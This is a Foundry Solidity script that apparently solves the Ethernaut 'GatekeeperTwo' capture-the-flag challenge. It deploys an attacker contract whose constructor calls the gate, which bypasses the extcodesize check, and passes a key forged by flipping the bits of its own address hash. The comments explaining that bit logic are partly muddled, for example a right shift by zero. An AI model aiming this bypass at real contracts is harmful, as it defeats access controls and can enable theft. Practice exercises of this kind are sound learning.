// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract Attacker {
    GatekeeperTwo private immutable gatekeeper;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperTwo(_gatekeeper);
        uint64 flip = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 flipShiftRight = flip >> uint8(0);
        gatekeeper.enter(bytes8(flipShiftRight));
    }
}

contract GatekeeperTwoScript is Script {
    /**
     * Resources: https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/
     * BitwiseOps: https://www.youtube.com/watch?v=i2o4TfSC9nA
     * XOR -> returns a 1 only if one of the bits equal to a 1. If both are 1 returns 0
     * NOT -> Used to flip as type(uint64).max in binary are all 1s
     * SHIFT RIGHT -> 63 needs to become 64 
     * 
     * uint64(bytes8(keccak256(abi.encodePacked(address(this))))) = 1001001101110011011011111110100101000010001010001110111111010110
     * uint64(_gateKey) = ?
     * type(uint64).max = 1111111111111111111111111111111111111111111111111111111111111111
     * 
     * 1. As we already know how the XOR works we need to flip uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
     * 2. After flipping we can notice there's 1 bit difference.
     * 1001001101110011011011111110100101000010001010001110111111010110
     * 110110010001100100100000001011010111101110101110001000000101001
     * 3. Shift right 
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperTwo gatekeeper = GatekeeperTwo(0x6c2F1ab4A6175E707964E7e681F298320FD33b43);
        Attacker attacker = new Attacker(address(gatekeeper));
        vm.stopBroadcast();

    }
}